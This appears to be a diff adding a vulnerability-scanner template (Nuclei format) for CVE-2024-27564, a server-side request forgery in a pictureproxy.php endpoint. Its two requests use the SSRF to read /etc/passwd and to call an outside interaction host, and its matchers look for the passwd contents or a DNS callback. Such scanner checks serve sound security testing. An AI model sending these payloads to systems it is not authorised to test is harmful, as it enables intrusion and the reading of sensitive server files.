@@ -1,0 +1,34 @@
+id: CVE-2024-27564
+
+info:
+  name: ChatGPT [Server Side Request Forgery]
+  author: Ghost_sec
+  severity: high
+  metadata:
+    verified: true
+    max-request: 2
+  tags: chatgpt
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/pictureproxy.php?url=file:///etc/passwd"
+      - "{{BaseURL}}/pictureproxy.php?url=http://{{interactsh-url}}"
+
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(header, "image/jpeg")
+          - regex('root:.*:0:0:', body)
+        condition: and
+
+      - type: dsl
+        dsl:
+          - contains(interactsh_protocol, "dns")
+          - contains(header, "image/jpeg")
+          - status_code == 200
+        condition: and
